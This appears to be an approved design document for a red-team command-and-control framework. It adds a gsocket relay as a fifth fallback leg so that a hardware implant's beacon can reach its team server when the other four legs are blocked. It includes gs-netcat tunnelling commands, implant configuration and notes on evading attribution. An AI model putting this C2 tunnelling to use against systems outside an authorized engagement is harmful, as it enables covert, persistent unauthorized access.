# A gsocket carrier as the beacon's fifth leg — design

**Date:** 2026-11-15
**Status:** approved 2026-11-19
**Plan:** [`docs/superpowers/plans/2026-11-19-gsocket-carrier.md`](../plans/2026-11-19-gsocket-carrier.md)

---

## Intent

The beacon has four legs and they share one precondition: every one of them
needs the team server to be reachable at an address the implant can name. An
HTTPS URL, a DNS zone, an SMB `host:port`, a QUIC `host:port` — four names for
infrastructure we own. When that infrastructure is blocked, burned, or simply
unreachable because egress leaves only an authenticating proxy we cannot
satisfy, all four fail together. They are four channels, not four chances.

`gsocket` has a different precondition. Both ends dial *out* to the Global
Socket Relay Network and find each other by a shared secret; neither end
accepts an inbound connection from the network, and no address of ours is
written anywhere on the target side. (The implant does open a *loopback*
forward for its own use — see *Known limits*. Nothing off-host can reach it.)

This work adds that as a fifth configurable leg in the connection matrix, for
the hardware implant, so the implant still comes back when the other four
cannot.

---

## Goals

- A fifth leg, `gsocket`, in `_FALLBACK_TRANSPORTS`, configured under
  `c2.fallback.gsocket` exactly as strictly as its four siblings, shipping
  disabled.
- **No new wire protocol.** The existing message exchange runs through the
  pipe; the AES-256-GCM envelope is untouched and nothing re-implements it.
- The leg takes itself out of the chain, with a stated reason, when its binary
  is missing or fails its hash — rather than costing every cycle a timeout.
- The rescue record says why this leg failed, as it does for the other four.
- The team server side holds **no encryption key**, consistent with the
  property every listener rests on.
- Generated single-file Python builds keep their stdlib-only, zero-dependency
  property, unchanged and still checkable.

## Non-goals

- **Not available in generated single-file builds.** The leg needs a binary on
  disk; a build that cannot have one must refuse the leg at generation time
  rather than emit a fifth leg that can never work.
- Not a replacement for the HTTPS leg, and not a reordering of the existing
  four. It goes last.
- No GSRN protocol or SRP implementation of our own (approach B below).
- Not the reverse SOCKS tunnel's transport. The forwarded port could carry it
  later and that is a good idea; it is out of scope here.
- No TOR mode (`gs-netcat -T`) in this work, though the config leaves room.

## Anti-goals

Things that would make this a failure even if the leg connects:

- **The gsocket secret on a command line.** `ps` is world-readable, and
  gsocket's own documentation warns against `-s` for this reason. A design that
  ends up with the secret in `argv` has failed.
- **A leg that looks healthy while delivering nothing.** This project has
  learned that lesson four times; a carrier process that is alive but whose
  pipe is dead must read as down.
- **Routing a client's traffic through third-party infrastructure without
  saying so.** See the first constraint. Undocumented, or enabled by default,
  is a failure.
- **A test suite that depends on the GSRN.** CI that breaks when a relay
  operated by somebody else has a bad day is worse than no test.

---

## Constraints

### 1. The GSRN is somebody else's infrastructure, and it is itself an indicator

The relay network is run by The Hacker's Choice as a free service. Two
consequences, and both belong in the operator documentation rather than in a
footnote:

- **The client's traffic crosses a third party.** It is end-to-end encrypted
  with SRP and the relay sees ciphertext only, which answers the
  confidentiality question and not the contractual one. On an authorized
  engagement, whether a client's data may transit a third-party relay is a
  question for the rules of engagement, not for a config file default.
- **It disguises where our C2 is, not that gsocket is in use.** The handshake
  to known GSRN hosts is recognizable, and gsocket is well-known tooling on
  the defensive side too. This leg buys reachability and non-attributable
  infrastructure. It does not buy looking like nothing.

That is why the block ships `enabled: false` and why `docs/LISTENERS.md` gains
a section that states both points before it states a single flag.

### 2. The rescue record has a budget, and a fifth transport fits it

The record is positional and fixed-width, and
`software/c2/dns_rescue.py` documents the chain it must survive. Measured
against that documented arithmetic:

| | record | base64 | wrapper | AES-GCM | base32 | labels |
|---|---|---|---|---|---|---|
| four transports (today) | 16 B | 24 | 32 | 60 | **96** | 2 |
| five transports | 19 B | 28 | 36 | 64 | **103** | 2 |

The ceiling is 126 characters — two labels of 63 — so a fifth transport fits
with 23 characters to spare and still needs no third label. The cost is seven
characters of the zone budget, which is real and small, and it must be written
down next to `PAYLOAD_CHARS` because the margin is now narrower than it was.

Three copies of this format must agree byte for byte — `beacon.py`,
`dns_rescue.py` and `server.py` — and a test holds them to it. All three change
together or the test fails, which is the arrangement working as intended.

### 3. The listener registry cannot hold this, and must not be bent to

`software/c2/listeners/registry.py` is built on `bind_host`, `bind_port` and
`relay_url`, and it refuses a port outside 1–65535, a missing `relay_url`, and
a `bind_port` equal to the relay's. The server-side gsocket carrier binds
nothing and POSTs nothing: it is a TCP forward from the GSRN into the team
server's existing beacon socket. Every one of those validations would have to
be special-cased away, and that module exists to refuse configurations that
cannot work. So the carrier gets its own configuration block and its own
process, the way the tunnel server did, for the same reason.

### 4. Hardware implant only

The binary is provisioned into the image. `software/c2/sliver.py` already does
exactly this for the Sliver implant — `implant_path`, `sha256`,
`restart_delay_seconds`, `max_restarts`, verify-before-exec, restart loop — and
this follows that shape rather than inventing a second one.

### 5. `beacon.py` is served as source text

The generator hands that file to a target as a single file, so the leg cannot
`import` a new module of ours. Its code lives in `beacon.py`, and the rescue
format copy stays a copy, as `relay.py`'s comment on `_PAYLOAD_FIELDS`
explains from the other side.

---

## Approaches

**A — gs-netcat as a carrier, the beacon's existing exchange running through
it. Chosen.**

The image carries a static `gs-netcat`. On the team server,
`gs-netcat -l -d 127.0.0.1 -p 8443` forwards GSRN connections into the beacon
socket. On the implant, `gs-netcat -p <local_port>` opens a loopback port whose
connections come out at the team server, and the `gsocket` leg performs the
same HTTP exchange the `https` leg performs — against `127.0.0.1:<local_port>`.
Zero new protocol code, the envelope untouched, TLS still end-to-end inside the
pipe, and the server side holds no key. Its costs are a binary on our own
image, a child process to supervise, and no availability in generated builds.

**B — the GSRN protocol and SRP re-implemented in Python. Rejected.**

It would keep the leg dependency-free and available in generated builds too.
But RFC 5054 SRP with a 4096-bit prime plus an undocumented wire protocol
reconstructed from C sources is a large amount of cryptographic code whose
failure mode is a silently dead leg, and it would need re-verifying every time
the GSRN changes. The reliability this work is for argues against it.

**C — gsocket for the tunnel only, not as a beacon leg. Rejected.**

Proposed during the conversation and set aside by the operator: the request is
for the connection matrix. The beacon is the access and the tunnel is the
convenience, so the reachability belongs on the beacon first.

---

## Design

### The two halves

**Implant.** The beacon spawns the carrier as a child process and then uses it
like any other HTTP endpoint:

```
gs-netcat -k <secret_file> -p <local_port>
→ loopback TCP on <local_port>, tunneled through the GSRN
→ the leg speaks to https://127.0.0.1:<local_port>/api/v1/beacon
```

**Team server.** One process, started from its own systemd unit:

```
gs-netcat -k <secret_file> -l -d 127.0.0.1 -p 8443
→ inbound GSRN connections land on the team server's beacon socket
```

**The pipe carries plain HTTP by default, and that is a correction.** An
earlier draft of this document specified `scheme: "https"` and argued for
end-to-end TLS inside the pipe. That argument was wrong on a fact:
`server.py`'s `--ssl` is `store_true` and off by default, and every shipped
`relay_url` in `configs/raccoon.yaml` is `http://127.0.0.1:8443` — the beacon
socket speaks plain HTTP in the default deployment and TLS is terminated at a
redirector upstream. A default of `https` therefore could not have connected to
a default team server, and the paragraph arguing against "a second, laxer path
into that socket" was arguing against the path its three existing listeners
already use.

So: `scheme` defaults to `http`, and the confidentiality of that hop rests on
two layers that are already there — the SRP/AES-256 session gsocket negotiates
end to end, and the AES-256-GCM envelope inside it, which the carrier cannot
read either way. `scheme: "https"` stays configurable for a deployment started
with `--ssl`. *(My call, correcting the draft.)*

### The carrier is an interface, so the tests do not need the GSRN

The leg talks to "a carrier that gives me a local port", not to `gs-netcat`.
Two implementations: the real one, and a test double that forwards a local port
to the team server directly. The anti-goal above is why — the leg's logic,
its readiness check, its failure classes and its place in the chain are all
testable offline, and only a manually-run rig exercises the real relay.

### Configuration, beacon side

`c2.fallback.gsocket`, validated as strictly as the rest, disabled or not:

```yaml
c2:
  fallback:
    gsocket:
      # Reaches the team server through the Global Socket Relay Network, a
      # third-party service. Read the GSRN section of docs/LISTENERS.md
      # before enabling this on an engagement.
      enabled: false
      binary_path: "/opt/raccoon/bin/gs-netcat"
      sha256: ""                       # verified before exec; empty skips
      secret_file: "/etc/raccoon/gsocket.secret"   # 0600, never argv
      local_port: 16443                # bound to 127.0.0.1 only
      scheme: "http"                   # the beacon socket's default; see above
      verify_ssl: false
      restart_delay_seconds: 30
      max_restarts: 0                  # 0 = unlimited, as sliver
      ready_timeout_seconds: 20
```

### Where it sits in the chain, and what that means for the rescue

Last, after `quic`. It is the leg most likely to get out and the most
noticeable one on the wire, which is the definition of a last resort.

It is an **upstream** leg: bidirectional, carrying registration, tasking and
results. So it joins `_RESCUE_UPSTREAM` and may re-arm the rescue latch — the
comment in `_beacon_loop` is explicit that only an upstream leg may, and this
one qualifies on the same grounds SMB and QUIC do.

### The secret

A file at mode 0600, read by `gs-netcat -k`, never `-s`, never in
`configs/raccoon.yaml`, following `RACCOON_LISTENER_TOKEN`'s precedent: a
shared secret does not belong in a file people paste into tickets. A
world-readable secret file is refused at startup with the mode in the message,
rather than used.

**One secret per implant, not one per fleet.** *(My call — flagged for the
operator at approval, because it is the decision in this document with the
largest blast radius.)* The gsocket documentation is explicit that a password
shared among more than two parties assumes everyone in that group plays nicely,
and that if the listening side stops listening, anyone else holding the secret
can take its place. With one fleet-wide secret, a single recovered Pi image
would hand its finder a dialable path to the team server's beacon socket for
every implant — bounded by the AES-256-GCM envelope, so exactly as far as a
compromised listener reaches, but across the whole fleet rather than one
device. Per-implant keeps a recovered image to itself.

The cost is real and is the larger part of this work's server side: a secret
store keyed by implant identity, with the tunnel's per-build key registry as
the precedent, one carrier process per implant, per-device provisioning instead
of one baked image value, and one panel row each.

Generating a secret is `gs-netcat -g`, and the operator documentation says so
rather than inviting a chosen password — anyone who guesses it reaches a port
that fronts our beacon socket.

### Child supervision, readiness, and when the carrier runs

Modelled on `sliver.py`: verify the hash, exec, restart after
`restart_delay_seconds`, honour `max_restarts`, and tear down the way
`_end_shell` does.

**Lazy, with a warm latch.** *(The operator's decision.)* The carrier does not
run at beacon start. It starts the first time a cycle ends with no upstream leg
having delivered — the condition the rescue latch already recognises — and then
**stays up** for the life of the process. So a healthy implant holds no GSRN
connection at all while HTTPS works, which is what constraint 1 asks for, and
the second outage costs no readiness wait, which is what the reliability goal
asks for. Strictly-lazy was rejected with it: restarting the carrier per
incident would put a readiness wait inside every failing cycle.

One consequence to build deliberately: on the very first cycle after the other
legs fail, this leg is not yet ready and reports `carrier_failed`, not
`unreachable`. That is a true statement about that cycle and the operator
documentation says the leg needs one cycle to warm up.

**A living child is not a working leg.** The leg reports up only once a TCP
connect to `local_port` succeeds within `ready_timeout_seconds`; until then the
chain moves past it and the cycle records its class. A missing binary or a hash
mismatch disables the leg for the process's lifetime, with the reason logged
once rather than per cycle.

Two flags the man page offers and this design takes: `-w` makes the client wait
for the far side to come up instead of failing immediately, and `-t` connects to
the GSRN only, to ask whether the peer is listening, without connecting it —
which is a health probe that costs no session. *(My call: `-w` on the carrier,
`-t` available to the panel and to diagnostics.)*

### The rescue record

`"gsocket"` is appended to `TRANSPORTS` in all three copies — appended, because
that file says the order is positional and not a tidiness a later reader may
rearrange. `PAYLOAD_CHARS` becomes 103 and its pinning assertion with it.

**`VERSION` goes to 2, and the server reads both.** `unpack` refuses on length
before it checks version, and `_handle_rescue` turns a refusal into a debug
line and a drop. Without a compatibility arm, every Pi already in the field and
every build already generated — each carrying its own 16-byte copy of the
format as source text — would have its rescue silently discarded, which is this
document's second anti-goal applied to the diagnostic itself. So `unpack`
accepts a 16-byte v1 record as four transports with `gsocket` reading
`not_attempted`, and a 19-byte v2 record as five. *(My call.)*

Two classes are added to `CLASSES`, which has room (ten values in one byte):
`binary_missing` and `carrier_failed`. They are the two failures this leg has
that none of the others do, and without them a stuck implant's rescue would
report its fifth leg as `unreachable` when the truth is that it never had a
binary to run.

### Registration, when gsocket is the only leg left

The case this whole feature exists for is the other four being blocked — so the
leg must be able to *register*, not only carry tasking and results. Today
`_beacon_loop`'s registration preamble is gated on `self.https_enabled` and the
register path runs through `_https_post`, which is bound to `self.callback_url`.
Left untouched, a gsocket-only implant would never appear in the fleet, and the
feature would fail in precisely its motivating case while looking fine
everywhere else.

So the preamble is generalised to the first enabled **upstream** leg rather
than to HTTPS specifically, and the leg also promotes `_registered` on a
successful cycle the way SMB and QUIC do. *(My call — the goal is unreachable
without it.)*

### Server side, and what the panel shows

Its own configuration block, `c2.gsocket_carrier` — not a `c2.listeners` entry,
for the reason under constraint 3.

**Supervised by the team server, like the tunnel server.** *(My call.)* The
carrier is a child process the team server starts and stops, with its row in
the panel and start/stop where the siblings have them. The alternative — a
systemd unit the panel merely observes — needs a status source for a process
the server did not spawn, and no such mechanism exists in this repository; the
known limit about containerised listeners reporting no counters is what
inventing one looks like. A `services/raccoon-gsocket.service` unit still
ships, for a host that wants the carrier without the panel, the way the tunnel
ships both.

Its row reports *no socket* where the others report bind host and port, and
with per-implant secrets there is one row per configured implant. A panel that
omitted it would send an operator to `systemctl` to answer a question the panel
answers for every sibling.

One case to handle explicitly, because it is today's behaviour and it would
read as a bug: with `c2.gsocket_carrier` configured and no `c2.listeners` at
all, the listeners route currently answers "no listeners are configured". It
must show the carrier.

### Provisioning

A pinned version and a recorded SHA-256, fetched at image build time in
`software/setup/build_image.sh`, never at runtime on the target. The upstream
project publishes static `aarch64` binaries, which is what the Pi needs.

---

## What is left to the builder

- The exact `gs-netcat` flag spelling, verified against the pinned version
  rather than against the README this design read.
- Whether the readiness probe reuses an existing helper in `beacon.py` or gets
  its own few lines.
- The panel row's wiring, within the shape above.
- The test double's form — a thread in the test process or a small script —
  provided CI needs no relay.
- The extension of `tools/listener_rig.py`, or a sibling rig, for the
  manually-run real-GSRN case.

## Known limits this will add

To be carried into *Known limits* in `docs/AGENT.md`, which a test holds:

- The leg is unavailable in generated single-file builds, so a build generated
  by the team server has four legs and the hardware implant has five.
- The carrier is a second process; killing it kills the leg, and the beacon
  restarts it on a delay rather than instantly.
- Reachability depends on a third-party relay network, and on its continued
  free operation.
- **The implant's carrier opens a loopback listening port.** Any local user on
  that host can then reach the team server's beacon socket through it,
  unauthenticated at the transport level. They cannot read or forge beacon
  traffic — the AES-256-GCM envelope bounds this to exactly what a compromised
  listener can do — but they can reach the endpoint and consume from it. The
  forward binds `127.0.0.1` only, and on the hardware implant the local users
  are ours.
